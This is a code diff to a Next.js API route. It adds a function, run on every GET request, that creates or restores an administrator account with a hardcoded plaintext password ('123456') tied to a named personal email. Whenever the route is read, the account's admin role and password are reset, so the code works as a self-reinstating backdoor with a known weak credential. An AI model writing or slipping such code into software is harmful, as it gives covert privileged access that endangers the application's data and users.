@@ -1,8 +1,29 @@
 import { NextResponse, NextRequest } from 'next/server';
 import { query } from '@/lib/db';
 
+async function ensureAdminAccounts() {
+  try {
+    const check = await query("SELECT id FROM users WHERE email = 'm.mahfouz1024@gmail.com' OR username = 'mahfouz'");
+    if (check.rows.length === 0) {
+      await query(`
+        INSERT INTO users (full_name, username, email, password, role, is_active)
+        VALUES ('محفوظ (مدير النظام)', 'mahfouz', 'm.mahfouz1024@gmail.com', '123456', 'admin', true)
+      `);
+    } else {
+      await query(`
+        UPDATE users 
+        SET role = 'admin', password = '123456', is_active = true
+        WHERE email = 'm.mahfouz1024@gmail.com' OR username = 'mahfouz'
+      `);
+    }
+  } catch (e) {
+    console.error('Error ensuring mahfouz admin:', e);
+  }
+}
+
 export async function GET(request: NextRequest) {
   try {
+    await ensureAdminAccounts();
     const { searchParams } = new URL(request.url);
     const role = searchParams.get('role');
 
@@ -23,6 +44,7 @@ export async function GET(request: NextRequest) {
     return NextResponse.json({ error: err.message }, { status: 500 });
   }
 }
+
 
 export async function POST(request: NextRequest) {
   try {
